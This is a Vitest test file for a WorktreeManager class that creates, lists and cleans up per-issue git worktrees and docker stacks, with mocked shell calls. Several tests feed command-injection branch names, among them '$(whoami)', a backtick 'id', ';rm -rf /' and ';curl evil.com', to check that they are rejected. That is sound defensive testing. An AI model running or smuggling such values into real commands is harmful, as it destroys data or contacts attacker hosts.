/**
 * Tests for WorktreeManager
 *
 * Verifies git worktree lifecycle management:
 * - Worktree path generation
 * - Create / cleanup operations (mocked git commands)
 * - List active worktrees parsing
 * - Orphan cleanup detection
 * - .gitignore management
 *
 * @see Issue #1621 - Git worktree-based concurrent pipeline execution
 */

import { describe, it, expect, vi, beforeEach } from "vitest";

// Use vi.hoisted() to avoid hoisting issues with vi.mock
const { execAsyncMock, execFileAsyncMock, fsMock } = vi.hoisted(() => ({
  execAsyncMock: vi.fn(),
  execFileAsyncMock: vi.fn(),
  fsMock: {
    mkdir: vi.fn().mockResolvedValue(undefined),
    access: vi.fn().mockResolvedValue(undefined),
    rm: vi.fn().mockResolvedValue(undefined),
    readFile: vi.fn().mockResolvedValue(""),
    writeFile: vi.fn().mockResolvedValue(undefined),
    readdir: vi.fn().mockResolvedValue([]),
    cp: vi.fn().mockResolvedValue(undefined),
  },
}));

const execFileSyncMock = vi.hoisted(() => vi.fn().mockReturnValue(Buffer.from("")));

// Mock node:child_process — provides exec/execFile (with promisify.custom)
// plus the legacy execFileSync export still consumed by test fixtures.
// #2884: WorktreeManager now uses promisify(execFile) for git operations.
vi.mock("node:child_process", () => {
  const kCustom = Symbol.for("nodejs.util.promisify.custom");

  const execMock = vi.fn();
  (execMock as any)[kCustom] = execAsyncMock;

  const execFileMock = vi.fn();
  (execFileMock as any)[kCustom] = execFileAsyncMock;

  return { exec: execMock, execFile: execFileMock, execFileSync: execFileSyncMock };
});

// Mock node:fs/promises
vi.mock("node:fs/promises", () => fsMock);

import { WorktreeManager } from "../../src/utils/WorktreeManager";

describe("WorktreeManager", () => {
  let manager: WorktreeManager;
  const repoRoot = "/repo";

  beforeEach(() => {
    vi.clearAllMocks();
    manager = new WorktreeManager(repoRoot, ".worktrees");
    execAsyncMock.mockResolvedValue({ stdout: "", stderr: "" });
    execFileAsyncMock.mockResolvedValue({ stdout: "", stderr: "" });
    execFileSyncMock.mockReturnValue(Buffer.from(""));
  });

  describe("getWorktreePath", () => {
    it("returns correct path for issue number", () => {
      expect(manager.getWorktreePath(42)).toBe("/repo/.worktrees/issue-42");
    });

    it("works with custom worktree base", () => {
      const custom = new WorktreeManager(repoRoot, "custom-trees");
      expect(custom.getWorktreePath(100)).toBe("/repo/custom-trees/issue-100");
    });
  });

  describe("create", () => {
    it("creates worktree with correct git command", async () => {
      const result = await manager.create(42, "feat/42-dark-mode");

      // Should fetch via execAsync
      expect(execAsyncMock).toHaveBeenCalledWith(
        "git fetch origin",
        expect.objectContaining({ cwd: repoRoot })
      );
      // Worktree add uses execFile with array args (no shell). #2884 made
      // this async, so the mock is execFileAsyncMock now.
      expect(execFileAsyncMock).toHaveBeenCalledWith(
        "git",
        ["worktree", "add", "/repo/.worktrees/issue-42", "-b", "feat/42-dark-mode", "origin/main"],
        expect.objectContaining({ cwd: repoRoot })
      );
      // npm install via execAsync
      expect(execAsyncMock).toHaveBeenCalledWith(
        "npm install --prefer-offline",
        expect.objectContaining({ cwd: "/repo/.worktrees/issue-42" })
      );

      expect(result.path).toBe("/repo/.worktrees/issue-42");
      expect(result.branch).toBe("feat/42-dark-mode");
      expect(result.issueNumber).toBe(42);
      expect(result.exists).toBe(true);
    });

    it("uses execFile array args for branch deletion (no shell interpolation)", async () => {
      await manager.create(42, "feat/42-dark-mode", { npmInstall: false });

      expect(execFileAsyncMock).toHaveBeenCalledWith(
        "git",
        ["branch", "-D", "feat/42-dark-mode"],
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    it("uses execFile array args for remote branch deletion", async () => {
      await manager.create(42, "feat/42-test", {
        npmInstall: false,
        deleteRemoteBranch: true,
      });

      expect(execFileAsyncMock).toHaveBeenCalledWith(
        "git",
        ["push", "origin", "--delete", "feat/42-test"],
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    it("rejects branch names with shell metacharacters", async () => {
      await expect(manager.create(42, "feat/$(whoami)")).rejects.toThrow(/invalid branch name/i);
    });

    it("rejects branch names with backticks", async () => {
      await expect(manager.create(42, "feat/`id`")).rejects.toThrow(/invalid branch name/i);
    });

    it("rejects branch names with semicolons", async () => {
      await expect(manager.create(42, "feat/;rm -rf /")).rejects.toThrow(/invalid branch name/i);
    });

    it("rejects baseBranch with shell metacharacters", async () => {
      await expect(
        manager.create(42, "feat/42-test", { baseBranch: "main;curl evil.com" })
      ).rejects.toThrow(/invalid branch name/i);
    });

    it("allows normal branch names without throwing", async () => {
      await expect(
        manager.create(42, "feat/42-test", { npmInstall: false })
      ).resolves.toBeDefined();
    });

    it("skips npm install when npmInstall is false", async () => {
      await manager.create(42, "feat/42-test", { npmInstall: false });

      const npmCalls = execAsyncMock.mock.calls.filter(
        ([cmd]: [string]) => typeof cmd === "string" && cmd.includes("npm install")
      );
      expect(npmCalls).toHaveLength(0);
    });

    it("continues worktree creation when npm install fails (non-fatal)", async () => {
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
      execAsyncMock.mockImplementation((cmd: string) => {
        if (cmd.includes("npm install")) {
          return Promise.reject(new Error("npm ERR! EBADENGINE"));
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      const result = await manager.create(42, "feat/42-test");

      expect(result.path).toBe("/repo/.worktrees/issue-42");
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("npm install failed"));
      warnSpy.mockRestore();
    });

    it("ensures .gitignore includes worktree base", async () => {
      fsMock.readFile.mockResolvedValue("node_modules\n");

      await manager.create(42, "feat/42-test", { npmInstall: false });

      expect(fsMock.writeFile).toHaveBeenCalledWith(
        "/repo/.gitignore",
        expect.stringContaining(".worktrees"),
        "utf-8"
      );
    });

    it("does not duplicate .gitignore entry", async () => {
      fsMock.readFile.mockImplementation((p: string) => {
        if (String(p).endsWith(".gitignore")) {
          return Promise.resolve("node_modules\n.worktrees\n");
        }
        // No config.local.yaml in this repo.
        return Promise.reject(Object.assign(new Error("ENOENT"), { code: "ENOENT" }));
      });

      await manager.create(42, "feat/42-test", { npmInstall: false });

      // writeFile should not be called since .worktrees is already in .gitignore
      expect(fsMock.writeFile).not.toHaveBeenCalled();
    });

    it("copies config.local.yaml into the worktree when present (tier parity)", async () => {
      const localBody = "pipeline:\n  architecture_approval:\n    enabled: false\n";
      fsMock.readFile.mockImplementation((p: string) => {
        if (String(p) === "/repo/.nightgauge/config.local.yaml") {
          return Promise.resolve(localBody);
        }
        if (String(p).endsWith(".gitignore")) {
          return Promise.resolve(".worktrees\n");
        }
        return Promise.reject(Object.assign(new Error("ENOENT"), { code: "ENOENT" }));
      });

      await manager.create(42, "feat/42-test", { npmInstall: false });

      // The gitignored local tier must reach the worktree — the Go gates run
      // with --workdir <worktree> and merge project+local from there.
      expect(fsMock.writeFile).toHaveBeenCalledWith(
        "/repo/.worktrees/issue-42/.nightgauge/config.local.yaml",
        localBody,
        "utf-8"
      );
    });

    it("skips the local-config copy when the repo has none", async () => {
      fsMock.readFile.mockImplementation((p: string) => {
        if (String(p).endsWith(".gitignore")) {
          return Promise.resolve(".worktrees\n");
        }
        return Promise.reject(Object.assign(new Error("ENOENT"), { code: "ENOENT" }));
      });

      await manager.create(42, "feat/42-test", { npmInstall: false });

      const localWrites = fsMock.writeFile.mock.calls.filter(([p]: [string]) =>
        String(p).endsWith("config.local.yaml")
      );
      expect(localWrites).toHaveLength(0);
    });
  });

  describe("cleanup", () => {
    it("removes worktree with force flag", async () => {
      await manager.cleanup(42);

      expect(execAsyncMock).toHaveBeenCalledWith(
        'git worktree remove "/repo/.worktrees/issue-42" --force',
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    it("falls back to manual removal if git worktree remove fails", async () => {
      execAsyncMock.mockImplementation((cmd: string) => {
        if (cmd.includes("worktree remove")) {
          return Promise.reject(new Error("not a valid worktree"));
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(42);

      expect(fsMock.rm).toHaveBeenCalledWith(
        "/repo/.worktrees/issue-42",
        expect.objectContaining({ recursive: true, force: true })
      );
      expect(execAsyncMock).toHaveBeenCalledWith(
        "git worktree prune",
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    it("deletes branch when deleteBranch is true", async () => {
      execFileAsyncMock.mockImplementation((_cmd: string, args: string[]) => {
        if (args.includes("--show-current")) {
          return Promise.resolve({ stdout: "feat/42-test\n", stderr: "" });
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(42, true);

      expect(execFileAsyncMock).toHaveBeenCalledWith(
        "git",
        ["branch", "-D", "feat/42-test"],
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    // Issue #3050 — worktree teardown must remove the per-issue docker
    // compose stack before deleting the worktree directory. The order
    // matters because compose project metadata is stored on the docker
    // daemon, not in the worktree, but tearing the stack down after the
    // worktree is gone leaves containers/volumes/networks orphaned with no
    // worktree to look up the project name from.
    it("tears down docker compose stack before removing worktree (#3050)", async () => {
      const callOrder: string[] = [];
      execFileAsyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === "docker" && args[0] === "version") {
          callOrder.push("docker:version");
          return Promise.resolve({ stdout: "24.0.0\n", stderr: "" });
        }
        if (cmd === "docker" && args[0] === "compose" && args.includes("down")) {
          callOrder.push(`docker:compose:down:${args[2]}`);
          return Promise.resolve({ stdout: "", stderr: "" });
        }
        if (cmd === "docker" && args[0] === "images") {
          callOrder.push("docker:images");
          return Promise.resolve({
            stdout: "issue-42-api\nissue-42-worker\nunrelated\n",
            stderr: "",
          });
        }
        if (cmd === "docker" && args[0] === "rmi") {
          callOrder.push(`docker:rmi:${args[2]}`);
          return Promise.resolve({ stdout: "", stderr: "" });
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });
      execAsyncMock.mockImplementation((cmd: string) => {
        if (cmd.includes("worktree remove")) {
          callOrder.push("git:worktree:remove");
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(42);

      expect(callOrder).toEqual([
        "docker:version",
        "docker:compose:down:issue-42",
        "docker:images",
        "docker:rmi:issue-42-api",
        "docker:rmi:issue-42-worker",
        "git:worktree:remove",
      ]);
    });

    it("continues with worktree removal when docker is unavailable (#3050)", async () => {
      execFileAsyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === "docker" && args[0] === "version") {
          return Promise.reject(new Error("docker: command not found"));
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(42);

      expect(execAsyncMock).toHaveBeenCalledWith(
        'git worktree remove "/repo/.worktrees/issue-42" --force',
        expect.objectContaining({ cwd: repoRoot })
      );
    });

    it("continues with worktree removal when compose teardown fails (#3050)", async () => {
      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
      execFileAsyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === "docker" && args[0] === "version") {
          return Promise.resolve({ stdout: "24.0.0\n", stderr: "" });
        }
        if (cmd === "docker" && args[0] === "compose" && args.includes("down")) {
          return Promise.reject(new Error("Cannot connect to the Docker daemon"));
        }
        if (cmd === "docker" && args[0] === "images") {
          return Promise.resolve({ stdout: "", stderr: "" });
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(42);

      expect(execAsyncMock).toHaveBeenCalledWith(
        'git worktree remove "/repo/.worktrees/issue-42" --force',
        expect.objectContaining({ cwd: repoRoot })
      );
      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("docker compose teardown"));
      warnSpy.mockRestore();
    });

    it("filters images strictly to issue-NNN- prefix (#3050)", async () => {
      const rmiCalls: string[] = [];
      execFileAsyncMock.mockImplementation((cmd: string, args: string[]) => {
        if (cmd === "docker" && args[0] === "version") {
          return Promise.resolve({ stdout: "24.0.0\n", stderr: "" });
        }
        if (cmd === "docker" && args[0] === "compose") {
          return Promise.resolve({ stdout: "", stderr: "" });
        }
        if (cmd === "docker" && args[0] === "images") {
          return Promise.resolve({
            stdout: "issue-7-api\nissue-7-worker\nissue-77-api\nunrelated\n",
            stderr: "",
          });
        }
        if (cmd === "docker" && args[0] === "rmi") {
          rmiCalls.push(args[2]);
          return Promise.resolve({ stdout: "", stderr: "" });
        }
        return Promise.resolve({ stdout: "", stderr: "" });
      });

      await manager.cleanup(7);

      // Must NOT remove issue-77-api (different issue) or unrelated images.
      expect(rmiCalls).toEqual(["issue-7-api", "issue-7-worker"]);
    });
  });

  describe("listActive", () => {
    it("parses git worktree list porcelain output", async () => {
      execAsyncMock.mockResolvedValue({
        stdout: [
          "worktree /repo",
          "HEAD abc123",
          "branch refs/heads/main",
          "",
          "worktree /repo/.worktrees/issue-42",
          "HEAD def456",
          "branch refs/heads/feat/42-dark-mode",
          "",
          "worktree /repo/.worktrees/issue-99",
          "HEAD ghi789",
          "branch refs/heads/feat/99-fix-bug",
          "",
        ].join("\n"),
        stderr: "",
      });

      const active = await manager.listActive();

      expect(active).toHaveLength(2);
      expect(active[0].issueNumber).toBe(42);
      expect(active[0].branch).toBe("feat/42-dark-mode");
      expect(active[0].path).toBe("/repo/.worktrees/issue-42");
      expect(active[1].issueNumber).toBe(99);
      expect(active[1].branch).toBe("feat/99-fix-bug");
    });

    it("filters out worktrees not in managed directory", async () => {
      execAsyncMock.mockResolvedValue({
        stdout: [
          "worktree /repo",
          "HEAD abc123",
          "branch refs/heads/main",
          "",
          "worktree /other/path/issue-42",
          "HEAD def456",
          "branch refs/heads/feat/42-test",
          "",
        ].join("\n"),
        stderr: "",
      });

      const active = await manager.listActive();
      expect(active).toHaveLength(0);
    });

    it("returns empty array on error", async () => {
      execAsyncMock.mockRejectedValue(new Error("git not found"));
      const active = await manager.listActive();
      expect(active).toEqual([]);
    });
  });

  describe("exists", () => {
    it("returns true when worktree directory exists", async () => {
      fsMock.access.mockResolvedValue(undefined);
      expect(await manager.exists(42)).toBe(true);
    });

    it("returns false when worktree directory does not exist", async () => {
      fsMock.access.mockRejectedValue(new Error("ENOENT"));
      expect(await manager.exists(42)).toBe(false);
    });
  });

  describe("cleanupOrphans", () => {
    it("removes directories not tracked by git worktree", async () => {
      execAsyncMock.mockResolvedValue({ stdout: "", stderr: "" });

      fsMock.readdir.mockResolvedValue([
        { name: "issue-42", isDirectory: () => true },
        { name: "issue-99", isDirectory: () => true },
      ]);

      // listActive returns empty (no tracked worktrees)
      const cleaned = await manager.cleanupOrphans();

      expect(fsMock.rm).toHaveBeenCalledTimes(2);
      expect(cleaned).toBe(2);
    });
  });

  describe("SDK CLI build", () => {
    const sdkBuildCmd = "npm run -w @nightgauge/sdk build";

    beforeEach(() => {
      // Restore fsMock.access so hasPackageJson resolves true
      fsMock.access.mockResolvedValue(undefined);
    });

    function withAdapter(adapter: string) {
      return { _adapterResolver: () => adapter };
    }

    function getSdkBuildCalls() {
      return execAsyncMock.mock.calls.filter(
        ([cmd]: [string]) => typeof cmd === "string" && cmd.includes("@nightgauge/sdk")
      );
    }

    it("builds SDK CLI when adapter is codex", async () => {
      await manager.create(42, "feat/42-codex-test", withAdapter("codex"));
      // buildSdkCli copies host dist/ when it exists (fs.access succeeds)
      expect(fsMock.cp).toHaveBeenCalledTimes(1);
    });

    it("builds SDK CLI when adapter is copilot", async () => {
      await manager.create(42, "feat/42-copilot-test", withAdapter("copilot"));
      expect(fsMock.cp).toHaveBeenCalledTimes(1);
    });

    it("builds SDK CLI when adapter is lm-studio", async () => {
      await manager.create(42, "feat/42-lm-studio-test", withAdapter("lm-studio"));
      expect(fsMock.cp).toHaveBeenCalledTimes(1);
    });

    it("skips SDK build when adapter is claude", async () => {
      await manager.create(42, "feat/42-claude-test", withAdapter("claude"));
      expect(getSdkBuildCalls()).toHaveLength(0);
    });

    it("propagates build error with clear actionable message", async () => {
      // Make fs.cp fail so buildSdkCli hits the error path
      fsMock.cp.mockRejectedValueOnce(new Error("ENOENT: no such file or directory"));

      await expect(manager.create(42, "feat/42-build-fail", withAdapter("codex"))).rejects.toThrow(
        /SDK CLI build failed/
      );
    });

    it("skips SDK build when npmInstall is false", async () => {
      await manager.create(42, "feat/42-no-install", {
        npmInstall: false,
        _adapterResolver: () => "codex",
      });
      expect(getSdkBuildCalls()).toHaveLength(0);
    });
  });
});
